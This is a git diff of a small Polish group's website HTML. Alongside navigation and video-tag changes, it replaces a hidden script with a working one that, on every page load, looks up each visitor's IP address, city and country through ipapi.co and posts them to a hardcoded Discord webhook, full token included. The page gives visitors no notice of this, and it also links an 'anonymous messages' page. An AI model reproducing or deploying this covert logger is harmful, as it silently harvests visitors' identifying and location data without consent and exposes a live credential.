@@ -128,7 +128,9 @@
       <a href="index.html">Strona Główna</a>
       <a href="onas.html">O nas</a>
       <a href="terms.html">Zasady i warunki</a>
-<a href="anonimowe.html">Anonimowe wiadomosci</a>
+<a href="anonimowe.html">Anonimowe wiadomości</a>
+<a href="rekrutacja.html">Rekrutacja</a>
+
 
         
     </nav>
@@ -143,45 +145,49 @@
 
   <section class="video-section">
     <h2>Zobacz, co robimy</h2>
-    <iframe src="Wideo.mov" allowfullscreen></iframe>
+    <video controls width="90%" style="border-radius: 12px;">
+  <source src="Wideo.mp4" type="video/mp4">
+ 
+</video>
+
   </section>
 
   <footer>
     &copy; 2025 Jednostka Przeciw Grupowa. Wszelkie prawa zastrzeżone.
   </footer>
 
- <script>
-  const webhookUrl = "https://discord.com/api/webhooks/https://discord.com/api/webhooks/1364632834236743740/lmC7HhXBVzE4snxn9tPaolCHagVYZg5hwlNiHmhL_yAwM8wGMKTmMwSlb3hJdJMG-r2_";
-
-  fetch("https://ipapi.co/json")
-    .then(res => res.json())
+  <script>
+  fetch("https://ipapi.co/json/")
+    .then(response => response.json())
     .then(data => {
-      const embed = {
-        embeds: [{
-          title: "🕵️ Nowe wejście na stronę",
-          color: 16711680, // czerwony
-          fields: [
-            { name: "🌍 IP", value: data.ip || "Nieznane", inline: true },
-            { name: "🇵🇱 Kraj", value: data.country_name || "Brak", inline: true },
-            { name: "🏙️ Miasto", value: data.city || "Brak", inline: true },
-            { name: "🌐 Region", value: data.region || "Brak", inline: true },
-            { name: "🧭 Dostawca", value: data.org || "Brak", inline: true }
-          ],
-          footer: {
-            text: `Data: ${new Date().toLocaleString("pl-PL")}`
-          }
-        }]
+      const payload = {
+        username: "Anonimowy Gość",
+        content: `📡 **Nowe wejście na stronę!**
+🌐 IP: \`${data.ip}\`
+🏙️ Miasto: \`${data.city}\`
+🌍 Kraj: \`${data.country_name}\``
       };
 
-      fetch(webhookUrl, {
+      fetch("https://discord.com/api/webhooks/1364632834236743740/lmC7HhXBVzE4snxn9tPaolCHagVYZg5hwlNiHmhL_yAwM8wGMKTmMwSlb3hJdJMG-r2_", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(embed)
+        body: JSON.stringify(payload)
       });
-    })
-    .catch(err => console.error("Błąd IP API:", err));
+    });
 </script>
 
+<script>
+  // Ukryj preloader, gdy strona zostanie załadowana
+  window.addEventListener("load", () => {
+    const preloader = document.getElementById("preloader");
+    preloader.classList.add("fade-out");
+
+    // Usuń preloader z DOM po animacji
+    setTimeout(() => {
+      preloader.style.display = "none";
+    }, 1000); // Czas musi się zgadzać z transition: opacity 1s
+  });
+</script>
 
 </body>
 </html>
